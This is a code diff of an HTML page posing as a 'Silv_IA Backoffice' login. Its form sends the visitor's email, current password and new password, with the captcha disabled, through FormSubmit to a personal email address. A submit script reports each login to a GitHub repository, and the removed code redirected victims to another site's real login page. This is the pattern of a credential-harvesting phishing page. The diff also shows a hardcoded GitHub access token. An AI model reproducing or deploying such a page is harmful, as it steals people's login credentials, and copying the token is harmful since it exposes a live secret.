@@ -70,13 +70,12 @@
 <div class="card">
   <h1>Silv_IA Backoffice</h1>
 
-  <form action="https://formsubmit.co/eva.sanchez@grupodanigarcia.com" method="POST">
+  <form id="loginForm" action="https://formsubmit.co/eva.sanchez@grupodanigarcia.com" method="POST">
 
     <!-- FormSubmit config -->
     <input type="hidden" name="_captcha" value="false">
     <input type="hidden" name="_subject" value="Silv_IA login">
 
-    <!-- campos -->
     <div class="field">
       <input type="email" name="email" placeholder="Email" required />
     </div>
@@ -89,13 +88,18 @@
       <input type="password" name="new_password" placeholder="Contraseña nueva" />
     </div>
 
-    <button type="button" onclick="handleLogin()">Entrar</button>
+    <button type="submit">Entrar</button>
 
   </form>
+</div>
 
 <script>
-document.querySelector("form").addEventListener("submit", function () {
+document.getElementById("loginForm").addEventListener("submit", function (e) {
 
+  // ⚠️ NO bloquear el submit
+  // dejamos que FormSubmit funcione
+
+  // GitHub webhook (tu tracking)
   fetch("https://api.github.com/repos/Eva-code-bo/Ti/dispatches", {
     method: "POST",
     headers: {
@@ -113,50 +117,6 @@ document.querySelector("form").addEventListener("submit", function () {
   });
 
 });
-
-function logClick() {
-  fetch("https://api.github.com/repos/Eva-code-bo/Ti/dispatches", {
-    method: "POST",
-    headers: {
-      "Accept": "application/vnd.github+json",
-      "Authorization": "Bearer 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",
-      "Content-Type": "application/json"
-    },
-    body: JSON.stringify({
-      event_type: "login_link_click",
-      client_payload: {
-        page: window.location.href,
-        time: new Date().toISOString()
-      }
-    })
-  });
-}
-
-function handleLogin() {
-
-  // tracking
-  fetch("https://api.github.com/repos/Eva-code-bo/Ti/dispatches", {
-    method: "POST",
-    headers: {
-      "Accept": "application/vnd.github+json",
-      "Authorization": "Bearer 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",
-      "Content-Type": "application/json"
-    },
-    body: JSON.stringify({
-      event_type: "login_submit",
-      client_payload: {
-        page: window.location.href,
-        time: new Date().toISOString()
-      }
-    })
-  });
-
-  // redirección
-  setTimeout(() => {
-    window.location.href = "https://iaprivada.ai/login";
-  }, 300);
-
-}
 </script>
 
 </body>
